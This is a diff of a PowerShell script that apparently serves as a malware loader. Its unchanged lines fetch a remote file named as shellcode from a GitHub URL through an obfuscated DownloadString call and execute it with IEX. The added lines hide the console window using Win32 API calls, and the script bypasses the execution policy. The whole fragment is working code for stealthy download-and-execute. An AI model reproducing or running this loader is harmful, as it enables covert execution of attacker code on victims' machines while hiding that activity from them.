@@ -2,13 +2,19 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-Add-Type -Name Win32 -Namespace Win32Functions -MemberDefinition @"
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
 "@
-
-$consolePtr = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle
-[Win32Functions.Win32]::ShowWindow($consolePtr, 0) | Out-Null
+$consolePtr = [Win32]::GetConsoleWindow()
+# 0 = Hide the console, 5 = Show the console
+[Win32]::ShowWindow($consolePtr, 0)
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
